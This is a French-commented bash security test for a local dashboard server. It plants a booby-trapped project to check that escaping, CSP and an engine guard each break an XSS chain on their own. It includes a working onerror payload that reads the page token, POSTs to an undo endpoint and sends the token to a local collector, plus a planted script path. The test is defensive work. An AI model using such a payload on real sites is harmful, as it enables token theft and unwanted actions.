#!/usr/bin/env bash
# test-cockpit-chaine-xss.sh — la chaîne « lab piégé -> script dans la page -> jeton -> POST /api/plan/undo -> script du lab »
# (audit 67-SECURITY B1+B2, M5). Trois maillons, chacun doit la casser SEUL :
#   échappement des champs du graphe · CSP · garde du moteur (jamais un script désigné par le lab).
# Lab piégé : un PLAN.md dont `wave:` porte une balise <img onerror> (rendue dans le pied de carte), un
# .cache/skill.json et un .cache/history/ plantés qui désignent un faux moteur (evil/scripts/plan.mjs écrit un marqueur).
# Navigateur : Chrome headless (CDP, WebSocket de node) quand il existe ($CHROME_BIN, macOS, google-chrome, chromium) ;
# sinon SIMULATION FIDÈLE : le rendu du pied de carte est rejoué par node (cardFoot extrait de la page servie), les
# en-têtes sont lus sur la réponse, et la charge du navigateur (lire le jeton, POST /api/plan/undo) est jouée par un client node.
# Mutants (copies de la sortie, jamais le module) : M-ESC retire h() du pied de carte, M-CSP neutralise les en-têtes
# Content-Security-Policy, M-GARDE rend à skillScript la lecture de .cache/skill.json.
#   C0 témoin : les trois maillons retirés -> la chaîne ABOUTIT (script du lab exécuté, jeton reçu par l'origine tierce)
#   C1 code livré : rien n'aboutit · C2 échappement seul · C3 CSP seule · C4 garde seule
# CHAINE_SEUL=temoin : ne joue que C0 (mesure « avant » sur un module antérieur aux correctifs).
# Exit 0 si tout passe, 1 sinon.

set -uo pipefail
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
SCRIPTS="$(cd "$(dirname "$0")/.." && pwd)"
WORK="$(mktemp -d)"; WORK="$(cd "$WORK" && pwd -P)"; AUX="$WORK/aux"; mkdir -p "$AUX" "$WORK/home"
export REAL_HOME="$HOME"; export HOME="$WORK/home"
export CHROME_SESSION="$(cd "$(dirname "$0")" && pwd)/chrome-session.mjs"
libre() { node -e "const s=require('net').createServer().listen(0,'127.0.0.1',()=>{console.log(s.address().port);s.close()})"; } # port libre choisi à l'exécution
PIDS=()
cleanup() { vf_hyg_fin; [ -n "${KEEP:-}" ] || rm -rf "$WORK"; }
trap cleanup EXIT
. "$(dirname "$0")/hygiene.sh"; vf_hyg_init

PASS=0; FAIL=0
assert_eq() { if [ "$2" = "$3" ]; then echo "  ✅ PASS — $1"; PASS=$((PASS+1)); else echo "  ❌ FAIL — $1"; echo "     attendu: [$3]"; echo "     obtenu:  [$2]"; FAIL=$((FAIL+1)); fi; }

CHROME=""
for c in "${CHROME_BIN:-}" "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" google-chrome google-chrome-stable chromium chromium-browser; do
  [ -n "$c" ] || continue
  if [ -x "$c" ] || command -v "$c" >/dev/null 2>&1; then CHROME="$c"; break; fi
done
[ -n "${CHAINE_SANS_NAVIGATEUR:-}" ] && CHROME=""
echo "navigateur : ${CHROME:-aucun (simulation fidèle)}"

# --- aides node ---
cat > "$AUX/collect.mjs" <<'JS'
// collect.mjs <port> <fichier> : origine tierce ; chaque requête reçue est consignée (ligne = chemin)
import http from 'node:http'; import fs from 'node:fs';
http.createServer((q, r) => { fs.appendFileSync(process.argv[3], q.url + '\n'); r.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); r.end('ok'); }).listen(Number(process.argv[2]), '127.0.0.1');
JS
cat > "$AUX/req.mjs" <<'JS'
// req.mjs <port> <méthode> <chemin> [jeton] : statut, en-têtes (JSON), corps
import http from 'node:http';
const [, , port, method, p, token] = process.argv;
const headers = { Host: `127.0.0.1:${port}`, ...(token ? { 'x-vf-cockpit-token': token } : {}) };
const r = http.request({ host: '127.0.0.1', port: Number(port), path: p, method, headers }, (res) => { let b = ''; res.on('data', (c) => (b += c)); res.on('end', () => { console.log(res.statusCode); console.log(JSON.stringify(res.headers)); process.stdout.write(b); }); });
r.on('error', (e) => console.log('ERR ' + e.message)); r.end();
JS
cat > "$AUX/browser.mjs" <<'JS'
// browser.mjs <chrome> <url> <graceMs> : ouvre la page en Chrome headless (socle chrome-session.mjs), rend { charges, cartes, violations }
// charges = éléments portant un attribut onerror dans le DOM rendu (la charge du lab est-elle devenue du HTML ?)
// La page est relevée quand elle est PRÊTE (load + au moins une carte dessinée), jamais après un délai fixe ; mesure indisponible -> { erreur } nommée.
import { pathToFileURL } from 'node:url';
const { executer, pause } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
const [, , chrome, url, grace] = process.argv;
await executer(chrome, async (s) => {
  await s.naviguer(url); await s.attendre("document.readyState === 'complete' && document.querySelectorAll('.card').length >= 1", 'cartes dessinées'); await pause(Number(grace) || 0);
  return { charges: await s.ev('document.querySelectorAll("[onerror]").length'), cartes: await s.ev('document.querySelectorAll(".card").length'), violations: [...s.violations] };
}, { csp: true });
JS
cat > "$AUX/simul.mjs" <<'JS'
// simul.mjs <port> : sans navigateur. Rejoue cardFoot (extrait de la page Projet servie) sur la charge du lab ; rend { charges }
import http from 'node:http';
const port = process.argv[2];
http.get({ host: '127.0.0.1', port: Number(port), path: '/project.html', headers: { Host: `127.0.0.1:${port}` } }, (r) => {
  let html = ''; r.on('data', (c) => (html += c)); r.on('end', () => {
    const h = /const h = \(s\) => [^\n]*/.exec(html)?.[0], i = html.indexOf('function cardFoot(item)');
    if (!h || i < 0) { console.log(JSON.stringify({ erreur: 'cardFoot introuvable' })); return; }
    let j = html.indexOf('\n}\n', i) + 3; const src = html.slice(i, j);
    const g = JSON.parse(html.slice(html.indexOf('window.VF_COCKPIT = ') + 20, html.indexOf(';</script>', html.indexOf('window.VF_COCKPIT = '))));
    const plan = g.files.find((f) => /onerror/.test(f.foot || ''));
    const fn = new Function('item', 'info', 'plural', 'statsOf', 'kids', 'routesByFile', 'recentOf', 'recentIn', 'recentLabel', h + '\n' + src + '\nreturn cardFoot(item);');
    const out = plan ? fn('f:x', () => ({ type: 'file', f: plan }), (n, w) => n + ' ' + w, () => ({ files: 0 }), new Map(), new Map(), () => null, new Map(), () => '') : '';
    console.log(JSON.stringify({ charges: /<img[^>]*onerror/i.test(out) ? 1 : 0, donnee: !!plan }));
  });
});
JS
jq_() { node -e "const j=JSON.parse(require('fs').readFileSync(0,'utf8'));const v=(function(j){return ($1)})(j);console.log(typeof v==='string'?v:JSON.stringify(v))"; }

# --- lab piégé ---
COLL_PORT="$(libre)"; COLL_LOG="$WORK/collecteur.log"; : > "$COLL_LOG"
node "$AUX/collect.mjs" "$COLL_PORT" "$COLL_LOG" & PIDS+=($!)
PAYLOAD="<img src=x onerror=fetch('/api/plan/undo',{method:'POST',headers:{'x-vf-cockpit-token':VF_COCKPIT_SERVER.token}});fetch('http://127.0.0.1:$COLL_PORT/?t='+VF_COCKPIT_SERVER.token)>"
LAB="$WORK/lab"; mkdir -p "$LAB/src" "$LAB/.planning/phases/01-x" "$LAB/evil/scripts"
printf 'export const util = () => 1;\n' > "$LAB/src/util.js"
printf -- '- [ ] **Phase 1: Socle** - premier jet\n' > "$LAB/.planning/ROADMAP.md"
printf -- '---\nwave: %s\n---\n<objective>Faire le socle</objective>\n' "$PAYLOAD" > "$LAB/.planning/phases/01-x/01-01-PLAN.md"
for s in plan build; do printf "import fs from 'node:fs'; fs.writeFileSync(%s,'executé par le serveur');\n" "'$WORK/MARQUEUR-SCRIPT-DU-LAB'" > "$LAB/evil/scripts/$s.mjs"; done
git -C "$LAB" init -q && git -C "$LAB" add -A && git -C "$LAB" -c user.email=t@t -c user.name=t commit -q -m init
node "$SCRIPTS/vf-cockpit-build.mjs" "$LAB" --quiet > "$WORK/build.out" 2>&1 || cat "$WORK/build.out"
SORTIE="$LAB/.vibeflow/cockpit"
# l'état « piégé » du lab, planté dans la sortie : le faux moteur désigné et un historique de plan
plante() { # $1 = sortie
  mkdir -p "$1/.cache/history/a"; printf '{"dir":"%s"}\n' "$LAB/evil" > "$1/.cache/skill.json"; printf '{}\n' > "$1/.cache/history/a/plan.json"; }

# mutant <sortie> <M-ESC|M-CSP|M-GARDE> : applique le mutant ; échoue si rien n'a changé (jamais un mutant sans effet)
mutant() {
  local o="$1" m="$2" before after
  before="$(cat "$o/serve.mjs" "$o/index.html" "$o/project.html" | cksum)"
  case "$m" in
    M-ESC) for f in index.html project.html; do sed -i.bak 's#<span class="meta">${h(size)}</span>#<span class="meta">${size}</span>#' "$o/$f"; done ;;
    M-CSP) sed -i.bak "s#res.setHeader('Content-Security-Policy'#res.setHeader('X-Mutant-Csp'#g" "$o/serve.mjs" ;;
    M-GARDE) sed -i.bak "s#const dir = engineDirFromLauncher();#let dir; try { dir = JSON.parse(fs.readFileSync(path.join(here, '.cache', 'skill.json'), 'utf8')).dir; } catch {}#; s#^try { fs.rmSync(path.join(here, '.cache', 'skill.json')#if (false) try { fs.rmSync(path.join(here, '.cache', 'skill.json')#" "$o/serve.mjs" ;;
  esac
  after="$(cat "$o/serve.mjs" "$o/index.html" "$o/project.html" | cksum)"
  [ "$before" != "$after" ] || { echo "  ❌ mutant $m sans effet (motif absent de la sortie)" >&2; return 1; }
}

# manche <étiquette> <mutants...> : sortie copiée, mutants posés, serveur lancé, page ouverte, effets relevés
# résultat : variables R_CHARGES R_MARQUEUR R_EXFIL R_UNDO
manche() {
  local label="$1"; shift
  local o="$WORK/sortie-$label"; rm -rf "$o"; cp -R "$SORTIE" "$o"; plante "$o"
  # le module d'exécution du lab piégé vit sous <lab>/.vibeflow/cockpit : les copies tournent dans leur propre dossier
  local m; for m in "$@"; do mutant "$o" "$m" || { R_CHARGES="mutant-sans-effet"; return; }; done
  rm -f "$WORK/MARQUEUR-SCRIPT-DU-LAB"; : > "$COLL_LOG"
  local eng="$SCRIPTS/../skills/cockpit-moteur"
  ( cd "$LAB" && VF_COCKPIT_ENGINE_DIR="$eng" VF_COCKPIT_SCRIPTS_DIR="$SCRIPTS" exec node "$o/serve.mjs" --no-open --port "$(libre)" > "$WORK/serve-$label.out" 2>&1 ) </dev/null >/dev/null 2>&1 &
  local pid=$!; PIDS+=($pid)
  for _ in $(seq 1 100); do [ -s "$o/.cache/server.json" ] && grep -q '"port"' "$o/.cache/server.json" && break; sleep 0.1; done
  local port; port="$(node -e "console.log(JSON.parse(require('fs').readFileSync('$o/.cache/server.json','utf8')).port)")"
  local res
  if [ -n "$CHROME" ]; then
    res="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/project.html#v=n:ph-1" 1500)"
    R_VIOL="$(printf '%s' "$res" | jq_ 'j.violations.length')"; R_CARTES="$(printf '%s' "$res" | jq_ 'j.cartes')"
    R_CODE="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/index.html" 1500)"
  else
    res="$(node "$AUX/simul.mjs" "$port")"
    # charge jouée par le client : le jeton de la page (si la page l'a), POST, exfiltration (bloquée seulement par la CSP)
    if [ "$(printf '%s' "$res" | jq_ 'j.charges')" = "1" ]; then
      local tok csp; tok="$(node "$AUX/req.mjs" "$port" GET /project.html | sed -n '3,$p' | sed -n 's/.*VF_COCKPIT_SERVER={"token":"\([0-9a-f]*\)".*/\1/p' | head -1)"
      csp="$(node "$AUX/req.mjs" "$port" GET /project.html | sed -n 2p | jq_ 'j["content-security-policy"]||""')"
      # un gestionnaire en ligne (onerror=) ne s'exécute que si la CSP n'a pas de script-src, ou si celle-ci admet 'unsafe-inline'
      local ssrc; ssrc="$(printf '%s' "$csp" | tr ';' '\n' | grep -E '^ *script-src' || true)"
      if [ -n "$ssrc" ]; then case "$ssrc" in *"'unsafe-inline'"*) : ;; *) tok="" ;; esac; fi
      if [ -n "$tok" ]; then
        node "$AUX/req.mjs" "$port" POST /api/plan/undo "$tok" > /dev/null
        case "$csp" in *"connect-src 'self'"*) : ;; *) node -e "fetch('http://127.0.0.1:$COLL_PORT/?t=$tok').catch(()=>0)"; sleep 0.5 ;; esac
      fi
    fi
  fi
  # les effets de la charge (script du lab, jeton chez l'origine tierce) arrivent de façon asynchrone : on les ATTEND quand la manche doit
  # les voir (échéance VF_CDP_ECHEANCE_S, 60 s), on laisse seulement une courte grâce quand elle doit constater leur absence
  local want=""; case "$label" in temoin) want="marq exfil" ;; garde) want="exfil" ;; esac
  local fin=$((SECONDS + ${VF_CDP_ECHEANCE_S:-60}))
  while [ "$SECONDS" -lt "$fin" ]; do
    local ok=1
    case " $want " in *" marq "*) [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] || ok=0 ;; esac
    case " $want " in *" exfil "*) grep -q '?t=[0-9a-f]\{16,\}' "$COLL_LOG" || ok=0 ;; esac
    [ "$ok" = 1 ] && break; [ -z "$want" ] && break; sleep 0.2
  done
  sleep 1
  kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
  R_CHARGES="$(printf '%s' "$res" | jq_ 'j.charges')"
  R_MARQUEUR=non; [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && R_MARQUEUR=oui
  R_EXFIL=non; grep -q '?t=[0-9a-f]\{16,\}' "$COLL_LOG" && R_EXFIL=oui
  echo "     [$label] mesure : charge-dans-le-DOM=$R_CHARGES script-du-lab-exécuté=$R_MARQUEUR jeton-reçu-par-l'origine-tierce=$R_EXFIL ${res:0:200}"
}

echo "=== C0 — témoin : les trois maillons retirés, la chaîne doit ABOUTIR ==="
manche temoin M-ESC M-CSP M-GARDE 2>/dev/null || true
if [ "${R_CHARGES:-}" = "mutant-sans-effet" ]; then
  # module antérieur aux correctifs : rien à muter, la sortie EST le témoin
  manche temoin
fi
assert_eq "C0.1 — la charge du lab devient du HTML dans la page" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C0.2 — le script désigné par le lab a été exécuté par POST /api/plan/undo" "$R_MARQUEUR" "oui"
assert_eq "C0.3 — le jeton est arrivé à l'origine tierce" "$R_EXFIL" "oui"
if [ "${CHAINE_SEUL:-}" = "temoin" ]; then echo "  (CHAINE_SEUL=temoin : seules les mesures « avant » sont jouées)"; else
echo "=== C1 — code livré : la chaîne n'aboutit nulle part ==="
manche livre
assert_eq "C1.1 — aucune balise de la charge dans le DOM rendu" "$R_CHARGES" "0"
assert_eq "C1.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C1.3 — aucun jeton reçu par l'origine tierce" "$R_EXFIL" "non"
if [ -n "$CHROME" ]; then
  assert_eq "C1.4 — la page Projet rendue sous la CSP : aucune violation" "$R_VIOL" "0"
  assert_eq "C1.5 — la page Projet rendue sous la CSP : des cartes dessinées (la page fonctionne)" "$([ "${R_CARTES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
  assert_eq "C1.6 — la page Code sous la CSP : aucune violation et des cartes" "$(printf '%s' "$R_CODE" | jq_ 'j.violations.length === 0 && j.cartes >= 1')" "true"
fi

echo "=== C2 — échappement SEUL (CSP et garde retirées) : la charge n'atteint pas le DOM ==="
manche esc M-CSP M-GARDE
assert_eq "C2.1 — maillon rompu : 0 charge dans le DOM" "$R_CHARGES" "0"
assert_eq "C2.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C2.3 — aucun jeton exfiltré" "$R_EXFIL" "non"

echo "=== C3 — CSP SEULE (échappement et garde retirés) : la balise existe, son code ne s'exécute pas ==="
manche csp M-ESC M-GARDE
assert_eq "C3.1 — témoin : la charge est bien dans le DOM (l'échappement est retiré)" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C3.2 — maillon rompu : aucun script du lab exécuté (le fetch inline est bloqué)" "$R_MARQUEUR" "non"
assert_eq "C3.3 — aucun jeton exfiltré" "$R_EXFIL" "non"

echo "=== C4 — garde .cache SEULE (échappement et CSP retirés) : tout s'exécute SAUF le script du lab ==="
manche garde M-ESC M-CSP
assert_eq "C4.1 — témoin : la charge est dans le DOM" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C4.2 — témoin : le jeton est exfiltré (la CSP est retirée)" "$R_EXFIL" "oui"
assert_eq "C4.3 — maillon rompu : le script désigné par le lab n'est PAS exécuté" "$R_MARQUEUR" "non"
fi

vf_hyg_assert
echo ""
echo "=================================="
echo "  Résultats : $PASS PASS / $FAIL FAIL"
echo "=================================="
TOTAL=$((PASS+FAIL))
if [ "$TOTAL" -eq 0 ]; then echo "  ❌ ÉCHEC ANTI-VERT-À-VIDE — zéro assertion exécutée"; exit 1; fi
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
